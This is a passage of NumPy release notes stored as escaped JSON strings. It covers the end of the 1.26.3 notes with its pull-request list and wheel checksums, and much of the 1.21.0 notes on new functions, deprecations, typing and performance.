on SPR\n* `25478 <https://github.com/numpy/numpy/pull/25478>`__: BLD: fix uninitialized variable warnings from simd/neon/memory.h\n* `25480 <https://github.com/numpy/numpy/pull/25480>`__: BUG: Handle ``iso_c_type`` mappings more consistently\n* `25481 <https://github.com/numpy/numpy/pull/25481>`__: BUG: Fix module name bug in signature files [urgent] [f2py]\n* `25482 <https://github.com/numpy/numpy/pull/25482>`__: BUG: Handle .pyf.src and fix SciPy [urgent]\n* `25483 <https://github.com/numpy/numpy/pull/25483>`__: DOC: ``f2py`` rewrite with ``meson`` details\n* `25485 <https://github.com/numpy/numpy/pull/25485>`__: BUG: Add external library handling for meson [f2py]\n* `25486 <https://github.com/numpy/numpy/pull/25486>`__: MAINT: Run f2py's meson backend with the same python that ran...\n* `25489 <https://github.com/numpy/numpy/pull/25489>`__: MAINT: Update ``numpy/f2py/_backends`` from main.\n* `25490 <https://github.com/numpy/numpy/pull/25490>`__: MAINT: Easy updates of ``f2py/*.py`` from main.\n* `25491 <https://github.com/numpy/numpy/pull/25491>`__: MAINT: Update crackfortran.py and f2py2e.py from main\n\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    7660db27715df261948e7f0f13634f16  numpy-1.26.3-cp310-cp310-macosx_10_9_x86_64.whl\n    98d5b98c822de4bed0cf1b0b8f367192  numpy-1.26.3-cp310-cp310-macosx_11_0_arm64.whl\n    b71cd0710cec5460292a97a02fa349cd  numpy-1.26.3-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    0f98a05c92598f849b1be2595f4a52a8  numpy-1.26.3-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    b866c6aea8070c0753b776d2b521e875  numpy-1.26.3-cp310-cp310-musllinux_1_1_aarch64.whl\n    cfdde5868e469fb27655ea73b0b9593b  numpy-1.26.3-cp310-cp310-musllinux_1_1_x86_64.whl\n    2655440d61671b5e32b049d30397c58f  numpy-1.26.3-cp310-cp310-win32.whl\n    7718a5d33344784ca7821f3bdd467550  numpy-1.26.3-cp310-cp310-win_amd64.whl\n    28e4b2ed9192c392f792d88b3c246d1c  numpy-1.26.3-cp311-cp311-macosx_10_9_x86_64.whl\n    fb1ae72749463e2c82f0127699728364  numpy-1.26.3-cp311-cp311-macosx_11_0_arm64.whl\n    304dec822b508a1d495917610e7562bf  numpy-1.26.3-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    2cc0d8b073dfd55946a60ba8ed4369f6  numpy-1.26.3-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    c99962375c599501820899c8ccab6960  numpy-1.26.3-cp311-cp311-musllinux_1_1_aarch64.whl\n    47ed42d067ce4863bbf1f40da61ba7d1  numpy-1.26.3-cp311-cp311-musllinux_1_1_x86_64.whl\n    3ab3757255feb54ca3793fb9db226586  numpy-1.26.3-cp311-cp311-win32.whl\n    c33f2a4518bae535645357a08a93be1a  numpy-1.26.3-cp311-cp311-win_amd64.whl\n    bea43600aaff3a4d9978611ccfa44198  numpy-1.26.3-cp312-cp312-macosx_10_9_x86_64.whl\n    c678d909ebe737fdabf215d8622ce2a3  numpy-1.26.3-cp312-cp312-macosx_11_0_arm64.whl\n    9f21f1875c92425cec1060564b3abb1c  numpy-1.26.3-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    c44a1998965d45ec136078ee09d880f2  numpy-1.26.3-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    9274f5c51fa4f3c8fac5efa3d78acd63  numpy-1.26.3-cp312-cp312-musllinux_1_1_aarch64.whl\n    07c9f8f86f45077febc46c87ebc0b644  numpy-1.26.3-cp312-cp312-musllinux_1_1_x86_64.whl\n    a4857b2f7b6a23bca41178bd344bb28a  numpy-1.26.3-cp312-cp312-win32.whl\n    495d9534961d7b10f16fec4515a3d72b  numpy-1.26.3-cp312-cp312-win_amd64.whl\n    6494f2d94fd1f184923a33e634692b5e  numpy-1.26.3-cp39-cp39-macosx_10_9_x86_64.whl\n    515a7314a0ff6aaba8d53a7a1aaa73ab  numpy-1.26.3-cp39-cp39-macosx_11_0_arm64.whl\n    c856adc6a6a78773c43e9c738d662ed5  numpy-1.26.3-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    09848456158a01feff28f88c6106aef1  numpy-1.26.3-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    adec00ea2bc98580a436f82e188c0e2f  numpy-1.26.3-cp39-cp39-musllinux_1_1_aarch64.whl\n    718bd35dd0431a6434bb30bf8d91d77d  numpy-1.26.3-cp39-cp39-musllinux_1_1_x86_64.whl\n    e813aa59cb807efb4a8fee52a6dd41ba  numpy-1.26.3-cp39-cp39-win32.whl\n    08e1b0973d0ae5976b38563eaec1253f  numpy-1.26.3-cp39-cp39-win_amd64.whl\n    e8887a14750161709636e9fb87df4f36  numpy-1.26.3-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    0bdb19040525451553fb5758b65caf4c  numpy-1.26.3-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    b931c14d06cc37d85d63ed1ddd88e875  numpy-1.26.3-pp39-pypy39_pp73-win_amd64.whl\n    1c915dc6c36dd4c674d9379e9470ff8b  numpy-1.26.3.tar.gz\n\nSHA256\n------\n::\n\n    806dd64230dbbfaca8a27faa64e2f414bf1c6622ab78cc4264f7f5f028fee3bf  numpy-1.26.3-cp310-cp310-macosx_10_9_x86_64.whl\n    02f98011ba4ab17f46f80f7f8f1c291ee7d855fcef0a5a98db80767a468c85cd  numpy-1.26.3-cp310-cp310-macosx_11_0_arm64.whl\n    6d45b3ec2faed4baca41c76617fcdcfa4f684ff7a151ce6fc78ad3b6e85af0a6  numpy-1.26.3-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    bdd2b45bf079d9ad90377048e2747a0c82351989a2165821f0c96831b4a2a54b  numpy-1.26.3-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    211ddd1e94817ed2d175b60b6374120244a4dd2287f4ece45d49228b4d529178  numpy-1.26.3-cp310-cp310-musllinux_1_1_aarch64.whl\n    b1240f767f69d7c4c8a29adde2310b871153df9b26b5cb2b54a561ac85146485  numpy-1.26.3-cp310-cp310-musllinux_1_1_x86_64.whl\n    21a9484e75ad018974a2fdaa216524d64ed4212e418e0a551a2d83403b0531d3  numpy-1.26.3-cp310-cp310-win32.whl\n    9e1591f6ae98bcfac2a4bbf9221c0b92ab49762228f38287f6eeb5f3f55905ce  numpy-1.26.3-cp310-cp310-win_amd64.whl\n    b831295e5472954104ecb46cd98c08b98b49c69fdb7040483aff799a755a7374  numpy-1.26.3-cp311-cp311-macosx_10_9_x86_64.whl\n    9e87562b91f68dd8b1c39149d0323b42e0082db7ddb8e934ab4c292094d575d6  numpy-1.26.3-cp311-cp311-macosx_11_0_arm64.whl\n    8c66d6fec467e8c0f975818c1796d25c53521124b7cfb760114be0abad53a0a2  numpy-1.26.3-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    f25e2811a9c932e43943a2615e65fc487a0b6b49218899e62e426e7f0a57eeda  numpy-1.26.3-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    af36e0aa45e25c9f57bf684b1175e59ea05d9a7d3e8e87b7ae1a1da246f2767e  numpy-1.26.3-cp311-cp311-musllinux_1_1_aarch64.whl\n    51c7f1b344f302067b02e0f5b5d2daa9ed4a721cf49f070280ac202738ea7f00  numpy-1.26.3-cp311-cp311-musllinux_1_1_x86_64.whl\n    7ca4f24341df071877849eb2034948459ce3a07915c2734f1abb4018d9c49d7b  numpy-1.26.3-cp311-cp311-win32.whl\n    39763aee6dfdd4878032361b30b2b12593fb445ddb66bbac802e2113eb8a6ac4  numpy-1.26.3-cp311-cp311-win_amd64.whl\n    a7081fd19a6d573e1a05e600c82a1c421011db7935ed0d5c483e9dd96b99cf13  numpy-1.26.3-cp312-cp312-macosx_10_9_x86_64.whl\n    12c70ac274b32bc00c7f61b515126c9205323703abb99cd41836e8125ea0043e  numpy-1.26.3-cp312-cp312-macosx_11_0_arm64.whl\n    7f784e13e598e9594750b2ef6729bcd5a47f6cfe4a12cca13def35e06d8163e3  numpy-1.26.3-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    5f24750ef94d56ce6e33e4019a8a4d68cfdb1ef661a52cdaee628a56d2437419  numpy-1.26.3-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    77810ef29e0fb1d289d225cabb9ee6cf4d11978a00bb99f7f8ec2132a84e0166  numpy-1.26.3-cp312-cp312-musllinux_1_1_aarch64.whl\n    8ed07a90f5450d99dad60d3799f9c03c6566709bd53b497eb9ccad9a55867f36  numpy-1.26.3-cp312-cp312-musllinux_1_1_x86_64.whl\n    f73497e8c38295aaa4741bdfa4fda1a5aedda5473074369eca10626835445511  numpy-1.26.3-cp312-cp312-win32.whl\n    da4b0c6c699a0ad73c810736303f7fbae483bcb012e38d7eb06a5e3b432c981b  numpy-1.26.3-cp312-cp312-win_amd64.whl\n    1666f634cb3c80ccbd77ec97bc17337718f56d6658acf5d3b906ca03e90ce87f  numpy-1.26.3-cp39-cp39-macosx_10_9_x86_64.whl\n    18c3319a7d39b2c6a9e3bb75aab2304ab79a811ac0168a671a62e6346c29b03f  numpy-1.26.3-cp39-cp39-macosx_11_0_arm64.whl\n    0b7e807d6888da0db6e7e75838444d62495e2b588b99e90dd80c3459594e857b  numpy-1.26.3-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    b4d362e17bcb0011738c2d83e0a65ea8ce627057b2fdda37678f4374a382a137  numpy-1.26.3-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    b8c275f0ae90069496068c714387b4a0eba5d531aace269559ff2b43655edd58  numpy-1.26.3-cp39-cp39-musllinux_1_1_aarch64.whl\n    cc0743f0302b94f397a4a65a660d4cd24267439eb16493fb3caad2e4389bccbb  numpy-1.26.3-cp39-cp39-musllinux_1_1_x86_64.whl\n    9bc6d1a7f8cedd519c4b7b1156d98e051b726bf160715b769106661d567b3f03  numpy-1.26.3-cp39-cp39-win32.whl\n    867e3644e208c8922a3be26fc6bbf112a035f50f0a86497f98f228c50c607bb2  numpy-1.26.3-cp39-cp39-win_amd64.whl\n    3c67423b3703f8fbd90f5adaa37f85b5794d3366948efe9a5190a5f3a83fc34e  numpy-1.26.3-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    46f47ee566d98849323f01b349d58f2557f02167ee301e5e28809a8c0e27a2d0  numpy-1.26.3-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    a8474703bffc65ca15853d5fd4d06b18138ae90c17c8d12169968e998e448bb5  numpy-1.26.3-pp39-pypy39_pp73-win_amd64.whl\n    697df43e2b6310ecc9d95f05d5ef20eacc09c7c4ecc9da3f235d39e71b7da1e4  numpy-1.26.3.tar.gz\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.21.0": "==========================\nThe NumPy 1.21.0 release highlights are\n\n* continued SIMD work covering more functions and platforms,\n* initial work on the new dtype infrastructure and casting,\n* universal2 wheels for Python 3.8 and Python 3.9 on Mac,\n* improved documentation,\n* improved annotations,\n* new ``PCG64DXSM`` bitgenerator for random numbers.\n\nIn addition there are the usual large number of bug fixes and other improvements.\n\nThe Python versions supported for this release are 3.7-3.9. Official support\nfor Python 3.10 will be added when it is released.\n\n.. warning::\n   There are unresolved problems compiling NumPy 1.20.0 with gcc-11.1.\n\n   * Optimization level `-O3` results in many incorrect warnings when\n     running the tests.\n   * On some hardware NumPY will hang in an infinite loop.\n\n\n\n\n\nNew functions\n=============\n\n.. currentmodule:: numpy.random\n\nAdd `PCG64DXSM` `BitGenerator`\n------------------------------\n\nUses of the ``PCG64`` ``BitGenerator`` in a massively-parallel context have been\nshown to have statistical weaknesses that were not apparent at the first\nrelease in numpy 1.17. Most users will never observe this weakness and are\nsafe to continue to use ``PCG64``. We have introduced a new ``PCG64DXSM``\n``BitGenerator`` that will eventually become the new default ``BitGenerator``\nimplementation used by ``default_rng`` in future releases. ``PCG64DXSM`` solves\nthe statistical weakness while preserving the performance and the features of\n``PCG64``.\n\nSee :ref:`upgrading-pcg64` for more details.\n\n.. currentmodule:: numpy\n\n(`gh-18906 <https://github.com/numpy/numpy/pull/18906>`__)\n\n\nExpired deprecations\n====================\n\n* The ``shape`` argument `~numpy.unravel_index` cannot be passed\n  as ``dims`` keyword argument anymore. (Was deprecated in NumPy 1.16.)\n\n  (`gh-17900 <https://github.com/numpy/numpy/pull/17900>`__)\n\n* The function ``PyUFunc_GenericFunction`` has been disabled.\n  It was deprecated in NumPy 1.19.  Users should call the ufunc\n  directly using the Python API.\n\n  (`gh-18697 <https://github.com/numpy/numpy/pull/18697>`__)\n\n* The function ``PyUFunc_SetUsesArraysAsData`` has been disabled.\n  It was deprecated in NumPy 1.19.\n\n  (`gh-18697 <https://github.com/numpy/numpy/pull/18697>`__)\n\n* The class ``PolyBase`` has been removed (deprecated in numpy 1.9.0). Please\n  use the abstract ``ABCPolyBase`` class instead.\n\n  (`gh-18963 <https://github.com/numpy/numpy/pull/18963>`__)\n\n* The unused ``PolyError`` and ``PolyDomainError`` exceptions are\n  removed.\n\n  (`gh-18963 <https://github.com/numpy/numpy/pull/18963>`__)\n\n\nDeprecations\n============\n\nThe ``.dtype`` attribute must return a ``dtype``\n------------------------------------------------\n\nA ``DeprecationWarning`` is now given if the ``.dtype`` attribute\nof an object passed into ``np.dtype`` or as a ``dtype=obj`` argument\nis not a dtype. NumPy will stop attempting to recursively coerce the\nresult of ``.dtype``.\n\n(`gh-13578 <https://github.com/numpy/numpy/pull/13578>`__)\n\nInexact matches for ``numpy.convolve`` and ``numpy.correlate`` are deprecated\n-----------------------------------------------------------------------------\n\n`~numpy.convolve` and `~numpy.correlate` now emit a warning when there are case\ninsensitive and/or inexact matches found for ``mode`` argument in the functions.\nPass full ``\"same\"``, ``\"valid\"``, ``\"full\"`` strings instead of\n``\"s\"``, ``\"v\"``, ``\"f\"`` for the ``mode`` argument.\n\n(`gh-17492 <https://github.com/numpy/numpy/pull/17492>`__)\n\n``np.typeDict`` has been formally deprecated\n--------------------------------------------\n``np.typeDict`` is a deprecated alias for ``np.sctypeDict`` and\nhas been so for over 14 years (6689502_).\nA deprecation warning will now be issued whenever getting ``np.typeDict``.\n\n.. _6689502: https://github.com/numpy/numpy/commit/668950285c407593a368336ff2e737c5da84af7d\n\n(`gh-17586 <https://github.com/numpy/numpy/pull/17586>`__)\n\nExceptions will be raised during array-like creation\n----------------------------------------------------\nWhen an object raised an exception during access of the special\nattributes ``__array__`` or ``__array_interface__``, this exception\nwas usually ignored.\nA warning is now given when the exception is anything but AttributeError.\nTo silence the warning, the type raising the exception has to be adapted\nto raise an ``AttributeError``.\n\n(`gh-19001 <https://github.com/numpy/numpy/pull/19001>`__)\n\nFour ``ndarray.ctypes`` methods have been deprecated\n----------------------------------------------------\nFour methods of the `ndarray.ctypes` object have been deprecated,\nas they are (undocumentated) implementation artifacts of their respective\nproperties.\n\nThe methods in question are:\n\n* ``_ctypes.get_data`` (use ``_ctypes.data`` instead)\n* ``_ctypes.get_shape`` (use ``_ctypes.shape`` instead)\n* ``_ctypes.get_strides`` (use ``_ctypes.strides`` instead)\n* ``_ctypes.get_as_parameter`` (use ``_ctypes._as_parameter_`` instead)\n\n(`gh-19031 <https://github.com/numpy/numpy/pull/19031>`__)\n\n\nExpired deprecations\n====================\n\n* The ``shape`` argument `numpy.unravel_index` cannot be passed\n  as ``dims`` keyword argument anymore. (Was deprecated in NumPy 1.16.)\n\n  (`gh-17900 <https://github.com/numpy/numpy/pull/17900>`__)\n\n* The function ``PyUFunc_GenericFunction`` has been disabled.\n  It was deprecated in NumPy 1.19.  Users should call the ufunc\n  directly using the Python API.\n\n  (`gh-18697 <https://github.com/numpy/numpy/pull/18697>`__)\n\n* The function ``PyUFunc_SetUsesArraysAsData`` has been disabled.\n  It was deprecated in NumPy 1.19.\n\n  (`gh-18697 <https://github.com/numpy/numpy/pull/18697>`__)\n\nRemove deprecated ``PolyBase`` and unused ``PolyError`` and ``PolyDomainError``\n-------------------------------------------------------------------------------\n\nThe class ``PolyBase`` has been removed (deprecated in numpy 1.9.0). Please use\nthe abstract ``ABCPolyBase`` class instead.\n\nFurthermore, the unused ``PolyError`` and ``PolyDomainError`` exceptions are\nremoved from the `numpy.polynomial`.\n\n(`gh-18963 <https://github.com/numpy/numpy/pull/18963>`__)\n\n\nCompatibility notes\n===================\n\nError type changes in universal functions\n-----------------------------------------\nThe universal functions may now raise different errors on invalid input in some\ncases.  The main changes should be that a ``RuntimeError`` was replaced with a\nmore fitting ``TypeError``.  When multiple errors were present in the same\ncall, NumPy may now raise a different one.\n\n(`gh-15271 <https://github.com/numpy/numpy/pull/15271>`__)\n\n``__array_ufunc__`` argument validation\n---------------------------------------\nNumPy will now partially validate arguments before calling ``__array_ufunc__``.\nPreviously, it was possible to pass on invalid arguments (such as a\nnon-existing keyword argument) when dispatch was known to occur.\n\n(`gh-15271 <https://github.com/numpy/numpy/pull/15271>`__)\n\n``__array_ufunc__`` and additional positional arguments\n-------------------------------------------------------\nPreviously, all positionally passed arguments were checked for\n``__array_ufunc__`` support.  In the case of ``reduce``, ``accumulate``, and\n``reduceat`` all arguments may be passed by position.  This means that when\nthey were passed by position, they could previously have been asked to handle\nthe ufunc call via ``__array_ufunc__``.  Since this depended on the way the\narguments were passed (by position or by keyword), NumPy will now only dispatch\non the input and output array.  For example, NumPy will never dispatch on the\n``where`` array in a reduction such as ``np.add.reduce``.\n\n(`gh-15271 <https://github.com/numpy/numpy/pull/15271>`__)\n\nValidate input values in ``Generator.uniform``\n----------------------------------------------\nChecked that ``high - low >= 0`` in ``np.random.Generator.uniform``. Raises\n``ValueError`` if ``low > high``. Previously out-of-order inputs were accepted\nand silently swapped, so that if ``low > high``, the value generated was\n``high + (low - high) * random()``.\n\n(`gh-17921 <https://github.com/numpy/numpy/pull/17921>`__)\n\n``/usr/include`` removed from default include paths\n---------------------------------------------------\nThe default include paths when building a package with ``numpy.distutils`` no\nlonger include ``/usr/include``. This path is normally added by the compiler,\nand hardcoding it can be problematic. In case this causes a problem, please\nopen an issue. A workaround is documented in PR 18658.\n\n(`gh-18658 <https://github.com/numpy/numpy/pull/18658>`__)\n\nChanges to comparisons with ``dtype=...``\n-----------------------------------------\nWhen the ``dtype=`` (or ``signature``) arguments to comparison\nufuncs (``equal``, ``less``, etc.) is used, this will denote\nthe desired output dtype in the future.\nThis means that:\n\n    np.equal(2, 3, dtype=object)\n\nwill give a ``FutureWarning`` that it will return an ``object``\narray in the future, which currently happens for:\n\n    np.equal(None, None, dtype=object)\n\ndue to the fact that ``np.array(None)`` is already an object\narray. (This also happens for some other dtypes.)\n\nSince comparisons normally only return boolean arrays, providing\nany other dtype will always raise an error in the future and\ngive a ``DeprecationWarning`` now.\n\n(`gh-18718 <https://github.com/numpy/numpy/pull/18718>`__)\n\nChanges to ``dtype`` and ``signature`` arguments in ufuncs\n----------------------------------------------------------\nThe universal function arguments ``dtype`` and ``signature``\nwhich are also valid for reduction such as ``np.add.reduce``\n(which is the implementation for ``np.sum``) will now issue\na warning when the ``dtype`` provided is not a \"basic\" dtype.\n\nNumPy almost always ignored metadata, byteorder or time units\non these inputs.  NumPy will now always ignore it and raise an\nerror if byteorder or time unit changed.\nThe following are the most important examples of changes which\nwill give the error.  In some cases previously the information\nstored was not ignored, in all of these an error is now raised::\n\n     Previously ignored the byte-order (affect if non-native)\n    np.add(3, 5, dtype=\">i32\")\n\n     The biggest impact is for timedelta or datetimes:\n    arr = np.arange(10, dtype=\"m8[s]\")\n     The examples always ignored the time unit \"ns\":\n    np.add(arr, arr, dtype=\"m8[ns]\")\n    np.maximum.reduce(arr, dtype=\"m8[ns]\")\n\n     The following previously did use \"ns\" (as opposed to `arr.dtype`)\n    np.add(3, 5, dtype=\"m8[ns]\")   Now return generic time units\n    np.maximum(arr, arr, dtype=\"m8[ns]\")   Now returns \"s\" (from `arr`)\n\nThe same applies for functions like ``np.sum`` which use these internally.\nThis change is necessary to achieve consistent handling within NumPy.\n\nIf you run into these, in most cases pass for example ``dtype=np.timedelta64``\nwhich clearly denotes a general ``timedelta64`` without any unit or byte-order\ndefined.  If you need to specify the output dtype precisely, you may do so\nby either casting the inputs or providing an output array using `out=`.\n\nNumPy may choose to allow providing an exact output ``dtype`` here in the\nfuture, which would be preceded by a ``FutureWarning``.\n\n(`gh-18718 <https://github.com/numpy/numpy/pull/18718>`__)\n\nUfunc ``signature=...`` and ``dtype=`` generalization and ``casting``\n---------------------------------------------------------------------\nThe behaviour for ``np.ufunc(1.0, 1.0, signature=...)`` or\n``np.ufunc(1.0, 1.0, dtype=...)`` can now yield different loops in 1.21\ncompared to 1.20 because of changes in promotion.\nWhen ``signature`` was previously used, the casting check on inputs\nwas relaxed, which could lead to downcasting inputs unsafely especially\nif combined with ``casting=\"unsafe\"``.\n\nCasting is now guaranteed to be safe.  If a signature is only\npartially provided, for example using ``signature=(\"float64\", None, None)``,\nthis could lead to no loop being found (an error).\nIn that case, it is necessary to provide the complete signature\nto enforce casting the inputs.\nIf ``dtype=\"float64\"`` is used or only outputs are set (e.g.\n``signature=(None, None, \"float64\")`` the is unchanged.\nWe expect that very few users are affected by this change.\n\nFurther, the meaning of ``dtype=\"float64\"`` has been slightly modified and\nnow strictly enforces only the correct output (and not input) DTypes.\nThis means it is now always equivalent to::\n\n    signature=(None, None, \"float64\")\n\n(If the ufunc has two inputs and one output).  Since this could lead\nto no loop being found in some cases, NumPy will normally also search\nfor the loop::\n\n    signature=(\"float64\", \"float64\", \"float64\")\n\nif the first search failed.\nIn the future, this behaviour may be customized to achieve the expected\nresults for more complex ufuncs.  (For some universal functions such as\n``np.ldexp`` inputs can have different DTypes.)\n\n(`gh-18880 <https://github.com/numpy/numpy/pull/18880>`__)\n\nDistutils forces strict floating point model on clang\n-----------------------------------------------------\nNumPy distutils will now always add the ``-ffp-exception-behavior=strict``\ncompiler flag when compiling with clang.  Clang defaults to a non-strict\nversion, which allows the compiler to generate code that does not set\nfloating point warnings/errors correctly.\n\n(`gh-19049 <https://github.com/numpy/numpy/pull/19049>`__)\n\n\nC API changes\n=============\n\nUse of ``ufunc->type_resolver`` and \"type tuple\"\n------------------------------------------------\nNumPy now normalizes the \"type tuple\" argument to the type resolver functions\nbefore calling it.  Note that in the use of this type resolver is legacy\nbehaviour and NumPy will not do so when possible.  Calling\n``ufunc->type_resolver`` or ``PyUFunc_DefaultTypeResolver`` is strongly\ndiscouraged and will now enforce a normalized type tuple if done.  Note that\nthis does not affect providing a type resolver, which is expected to keep\nworking in most circumstances.  If you have an unexpected use-case for calling\nthe type resolver, please inform the NumPy developers so that a solution can be\nfound.\n\n(`gh-18718 <https://github.com/numpy/numpy/pull/18718>`__)\n\n\nNew Features\n============\n\nAdded a mypy plugin for handling platform-specific ``numpy.number`` precisions\n------------------------------------------------------------------------------\nA mypy_ plugin is now available for automatically assigning the (platform-dependent)\nprecisions of certain `~numpy.number` subclasses, including the likes of\n`~numpy.int_`, `~numpy.intp` and `~numpy.longlong`. See the documentation on\n:ref:`scalar types <arrays.scalars.built-in>` for a comprehensive overview\nof the affected classes.\n\nNote that while usage of the plugin is completely optional, without it the\nprecision of above-mentioned classes will be inferred as `~typing.Any`.\n\nTo enable the plugin, one must add it to their mypy `configuration file`_:\n\n.. code-block:: ini\n\n    [mypy]\n    plugins = numpy.typing.mypy_plugin\n\n\n.. _mypy: http://mypy-lang.org/\n.. _configuration file: https://mypy.readthedocs.io/en/stable/config_file.html\n\n(`gh-17843 <https://github.com/numpy/numpy/pull/17843>`__)\n\nLet the mypy plugin manage extended-precision ``numpy.number`` subclasses\n-------------------------------------------------------------------------\nThe mypy_ plugin, introduced in `numpy/numpy17843`_, has been expanded:\nthe plugin now removes annotations for platform-specific extended-precision\ntypes that are not available to the platform in question.\nFor example, it will remove `~numpy.float128` when not available.\n\nWithout the plugin *all* extended-precision types will, as far as mypy is concerned,\nbe available on all platforms.\n\nTo enable the plugin, one must add it to their mypy `configuration file`_:\n\n.. code-block:: ini\n\n    [mypy]\n    plugins = numpy.typing.mypy_plugin\n\n\n.. _mypy: http://mypy-lang.org/\n.. _configuration file: https://mypy.readthedocs.io/en/stable/config_file.html\n.. _`numpy/numpy17843`: https://github.com/numpy/numpy/pull/17843\n\n(`gh-18322 <https://github.com/numpy/numpy/pull/18322>`__)\n\nNew ``min_digits`` argument for printing float values\n-----------------------------------------------------\nA new ``min_digits`` argument has been added to the dragon4 float printing\nfunctions `~numpy.format_float_positional` and `~numpy.format_float_scientific`\n. This kwd guarantees that at least the given number of digits will be printed\nwhen printing in unique=True mode, even if the extra digits are unnecessary to\nuniquely specify the value. It is the counterpart to the precision argument\nwhich sets the maximum number of digits to be printed. When unique=False in\nfixed precision mode, it has no effect and the precision argument fixes the\nnumber of digits.\n\n(`gh-18629 <https://github.com/numpy/numpy/pull/18629>`__)\n\nf2py now recognizes Fortran abstract interface blocks\n-----------------------------------------------------\n`~numpy.f2py` can now parse abstract interface blocks.\n\n(`gh-18695 <https://github.com/numpy/numpy/pull/18695>`__)\n\nBLAS and LAPACK configuration via environment variables\n-------------------------------------------------------\nAutodetection of installed BLAS and LAPACK libraries can be bypassed by using\nthe ``NPY_BLAS_LIBS`` and ``NPY_LAPACK_LIBS`` environment variables. Instead,\nthe link flags in these environment variables will be used directly, and the\nlanguage is assumed to be F77.  This is especially useful in automated builds\nwhere the BLAS and LAPACK that are installed are known exactly.  A use case is\nreplacing the actual implementation at runtime via stub library links.\n\nIf ``NPY_CBLAS_LIBS`` is set (optional in addition to ``NPY_BLAS_LIBS``), this\nwill be used as well, by defining ``HAVE_CBLAS`` and appending the environment\nvariable content to the link flags.\n\n(`gh-18737 <https://github.com/numpy/numpy/pull/18737>`__)\n\nA runtime-subcriptable alias has been added for ``ndarray``\n-----------------------------------------------------------\n``numpy.typing.NDArray`` has been added, a runtime-subscriptable alias for\n``np.ndarray[Any, np.dtype[~Scalar]]``. The new type alias can be used\nfor annotating arrays with a given dtype and unspecified shape. :sup:`1`\n\n:sup:`1` NumPy does not support the annotating of array shapes as of 1.21,\nthis is expected to change in the future though (see :pep:`646`).\n\nExamples\n~~~~~~~~\n\n.. code-block:: python\n\n    >>> import numpy as np\n    >>> import numpy.typing as npt\n\n    >>> print(npt.NDArray)\n    numpy.ndarray[typing.Any, numpy.dtype[~ScalarType]]\n\n    >>> print(npt.NDArray[np.float64])\n    numpy.ndarray[typing.Any, numpy.dtype[numpy.float64]]\n\n    >>> NDArrayInt = npt.NDArray[np.int_]\n    >>> a: NDArrayInt = np.arange(10)\n\n    >>> def func(a: npt.ArrayLike) -> npt.NDArray[Any]:\n    ...     return np.array(a)\n\n(`gh-18935 <https://github.com/numpy/numpy/pull/18935>`__)\n\n\nImprovements\n============\n\nArbitrary ``period`` option for ``numpy.unwrap``\n------------------------------------------------\nThe size of the interval over which phases are unwrapped is no longer restricted to ``2 * pi``.\nThis is especially useful for unwrapping degrees, but can also be used for other intervals.\n\n.. code:: python\n\n    >>> phase_deg = np.mod(np.linspace(0,720,19), 360) - 180\n    >>> phase_deg\n    array([-180., -140., -100.,  -60.,  -20.,   20.,   60.,  100.,  140.,\n           -180., -140., -100.,  -60.,  -20.,   20.,   60.,  100.,  140.,\n           -180.])\n\n    >>> unwrap(phase_deg, period=360)\n    array([-180., -140., -100.,  -60.,  -20.,   20.,   60.,  100.,  140.,\n            180.,  220.,  260.,  300.,  340.,  380.,  420.,  460.,  500.,\n            540.])\n\n(`gh-16987 <https://github.com/numpy/numpy/pull/16987>`__)\n\n``np.unique`` now returns single ``NaN``\n----------------------------------------\nWhen ``np.unique`` operated on an array with multiple ``NaN`` entries,\nits return included a ``NaN`` for each entry that was ``NaN`` in the original array.\nThis is now improved such that the returned array contains just one ``NaN`` as the\nlast element.\n\nAlso for complex arrays all ``NaN`` values are considered equivalent\n(no matter whether the ``NaN`` is in the real or imaginary part). As the\nrepresentant for the returned array the smallest one in the\nlexicographical order is chosen - see ``np.sort`` for how the lexicographical\norder is defined for complex arrays.\n\n(`gh-18070 <https://github.com/numpy/numpy/pull/18070>`__)\n\n``Generator.rayleigh`` and ``Generator.geometric`` performance improved\n-----------------------------------------------------------------------\nThe performance of Rayleigh and geometric random variate generation\nin ``Generator`` has improved. These are both transformation of exponential\nrandom variables and the slow log-based inverse cdf transformation has\nbeen replaced with the Ziggurat-based exponential variate generator.\n\nThis change breaks the stream of variates generated  when variates from\neither of these distributions are produced.\n\n(`gh-18666 <https://github.com/numpy/numpy/pull/18666>`__)\n\nPlaceholder annotations have been improved\n------------------------------------------\nAll placeholder annotations, that were previously annotated as ``typing.Any``,\nhave been improved. Where appropiate they have been replaced with explicit\nfunction definitions, classes or other miscellaneous objects.\n\n(`gh-18934 <https://github.com/numpy/numpy/pull/18934>`__)\n\n\nPerformance improvements\n========================\n\nImproved performance in integer division of NumPy arrays\n--------------------------------------------------------\nInteger division of NumPy arrays now uses\n`libdivide <https://libdivide.com/>`__ when the divisor is a constant. With the\nusage of libdivide and other minor optimizations, there is a large speedup.\nThe ``//`` operator and ``np.floor_divide`` makes use of the new changes.\n\n(`gh-17727 <https://github.com/numpy/numpy/pull/17727>`__)\n\nImprove performance of ``np.save`` and ``np.load`` for small arrays\n-------------------------------------------------------------------\n``np.save`` is now a lot faster for small arrays.\n\n``np.load`` is also faster for small arrays,\nbut only when 